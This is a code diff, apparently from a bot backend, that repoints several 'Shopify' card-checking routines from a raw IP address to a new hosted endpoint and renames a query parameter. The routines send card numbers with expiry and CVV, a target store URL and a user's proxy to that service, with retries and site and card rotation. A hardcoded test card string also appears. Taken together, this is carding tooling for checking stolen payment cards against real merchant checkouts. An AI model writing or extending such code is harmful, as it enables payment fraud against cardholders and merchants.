@@ -5461,7 +5461,7 @@ ${shCountryFlag} ${escapeHtml(shBinCountry)}
 `);
 
         const startTime = Date.now();
-        const SHOPIFY_API_URL = "http://108.165.12.183:8081/";
+        const SHOPIFY_API_URL = "https://lavda-lasan.up.railway.app/shopify";
         const SHOPIFY_DEBUG_CHAT = "-1003848532661";
         const SH_UNKNOWN_RETRIES = 4;
 
@@ -5521,8 +5521,8 @@ Admin needs to add sites via Health Check.
           // Helper: single API call
           const callShopifyOnce = async (cardCC: string, siteUrl: string, proxy: string) => {
             const apiUrl = proxy
-              ? `${SHOPIFY_API_URL}?cc=${encodeURIComponent(cardCC)}&url=${encodeURIComponent(siteUrl)}&proxy=${encodeURIComponent(proxy)}`
-              : `${SHOPIFY_API_URL}?cc=${encodeURIComponent(cardCC)}&url=${encodeURIComponent(siteUrl)}`;
+              ? `${SHOPIFY_API_URL}?cc=${encodeURIComponent(cardCC)}&site=${encodeURIComponent(siteUrl)}&proxy=${encodeURIComponent(proxy)}`
+              : `${SHOPIFY_API_URL}?cc=${encodeURIComponent(cardCC)}&site=${encodeURIComponent(siteUrl)}`;
             const controller = new AbortController();
             const timeout = setTimeout(() => controller.abort(), 55000);
             try {
@@ -5873,7 +5873,7 @@ ${shCountryFlag} ${escapeHtml(shBinCountry)}
         const { data: mshProxiesRaw } = await supabase.from("user_proxies").select("*").eq("user_id", mshProfile.user_id);
         const mshProxies = mshProxiesRaw || [];
 
-        const SHOPIFY_API_URL_MSH = "http://108.165.12.183:8081/";
+        const SHOPIFY_API_URL_MSH = "https://lavda-lasan.up.railway.app/shopify";
         const MSH_DEBUG_CHAT = "-1003848532661";
         const MSH_UNKNOWN_RETRIES = 3;
         const mshStartTime = Date.now();
@@ -5924,8 +5924,8 @@ ${shCountryFlag} ${escapeHtml(shBinCountry)}
         // Single call helper
         const mshCallOnce = async (cardCC: string, siteUrl: string, proxy: string) => {
           const apiUrl = proxy
-            ? `${SHOPIFY_API_URL_MSH}?cc=${encodeURIComponent(cardCC)}&url=${encodeURIComponent(siteUrl)}&proxy=${encodeURIComponent(proxy)}`
-            : `${SHOPIFY_API_URL_MSH}?cc=${encodeURIComponent(cardCC)}&url=${encodeURIComponent(siteUrl)}`;
+            ? `${SHOPIFY_API_URL_MSH}?cc=${encodeURIComponent(cardCC)}&site=${encodeURIComponent(siteUrl)}&proxy=${encodeURIComponent(proxy)}`
+            : `${SHOPIFY_API_URL_MSH}?cc=${encodeURIComponent(cardCC)}&site=${encodeURIComponent(siteUrl)}`;
           const controller = new AbortController();
           const timeout = setTimeout(() => controller.abort(), 45000);
           try {
@@ -6284,7 +6284,7 @@ ${shCountryFlag} ${escapeHtml(shBinCountry)}
         const { data: mtxtProxiesRaw } = await supabase.from("user_proxies").select("*").eq("user_id", mtxtProfile.user_id);
         const mtxtProxies = mtxtProxiesRaw || [];
 
-         const SHOPIFY_API_URL_MTXT = "http://108.165.12.183:8081/";
+         const SHOPIFY_API_URL_MTXT = "https://lavda-lasan.up.railway.app/shopify";
          const MTXT_MAX_RETRIES = 1; // Keep /mtxt fast: one hard API retry, then rotate site/card thread
          const MTXT_API_TIMEOUT_MS = 30000;
          const mtxtStartTime = Date.now();
@@ -6351,10 +6351,10 @@ ${shCountryFlag} ${escapeHtml(shBinCountry)}
 
          // Single API call — exact match of web callApiOnce
           const mtxtBuildApiUrl = (cardCC: string, siteUrl: string, proxy: string) => {
-            // Query param format: domain/sh?cc={cc}&url={site}&proxy={proxy}
+            // Query param format: domain/shopify?cc={cc}&site={site}&proxy={proxy}
             const params = new URLSearchParams();
             params.set("cc", cardCC.trim());
-            params.set("url", siteUrl.trim());
+            params.set("site", siteUrl.trim());
             if (proxy?.trim()) params.set("proxy", proxy.trim());
             return `${SHOPIFY_API_URL_MTXT}?${params.toString()}`;
           };
@@ -9798,8 +9798,8 @@ ${resultsDisplay || "Waiting for results..."}
       const API_ENDPOINTS = [
         (site: string, cc: string, proxy: string) =>
           proxy
-            ? `http://108.165.12.183:8081/?cc=${encodeURIComponent(cc)}&url=${encodeURIComponent(site)}&proxy=${encodeURIComponent(proxy)}`
-            : `http://108.165.12.183:8081/?cc=${encodeURIComponent(cc)}&url=${encodeURIComponent(site)}`,
+            ? `https://lavda-lasan.up.railway.app/shopify?cc=${encodeURIComponent(cc)}&site=${encodeURIComponent(site)}&proxy=${encodeURIComponent(proxy)}`
+            : `https://lavda-lasan.up.railway.app/shopify?cc=${encodeURIComponent(cc)}&site=${encodeURIComponent(site)}`,
       ];
       const TEST_CC = "4266841674104656|03|27|908";
 
